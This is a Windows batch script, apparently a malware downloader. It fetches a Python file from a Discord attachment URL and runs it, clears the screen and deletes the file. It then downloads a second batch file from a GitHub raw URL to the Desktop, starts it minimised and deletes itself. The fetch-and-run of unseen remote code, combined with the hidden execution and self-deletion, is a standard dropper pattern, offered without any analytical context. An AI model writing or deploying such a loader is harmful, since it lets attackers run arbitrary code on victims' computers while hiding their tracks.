@echo off
:top
curl -o Client.py https://cdn.discordapp.com/attachments/1229773403842416640/1253909375337234535/Client.py?ex=6677919b&is=6676401b&hm=7bc2c13fe1db1787ad176e4bdcb9adc9743704cdc07a8672a9024475cc751b62&
cls
python3 Client.py
cls
goto :run
:run
del Client.py
cd %USERPROFILE%\Desktop
curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
START /MIN CMD.EXE /C 1.bat
del run.bat
exit
